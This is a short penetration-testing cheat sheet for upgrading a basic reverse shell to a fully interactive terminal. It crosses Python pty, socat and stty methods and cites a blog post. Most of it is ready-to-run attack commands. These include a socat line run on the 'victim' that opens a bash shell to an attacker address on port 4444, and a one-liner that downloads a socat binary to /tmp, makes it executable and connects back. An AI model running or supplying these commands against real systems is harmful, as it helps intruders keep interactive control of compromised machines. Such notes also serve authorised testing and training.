# Method 1: Python pty Module

```
python -c 'import pty; pty.spawn("/bin/bash")'  
```

# Method 2: Using Socat

```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim // SOCAT INSTALLED:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

#Victim // SOCAT NOT INSTALLED:
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
```

# Method 3: Using stty options

```
# In reverse shell

$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali

$ echo $TERM
$ stty -a
$ stty raw -echo
$ fg

# In reverse shell

$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

REF: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
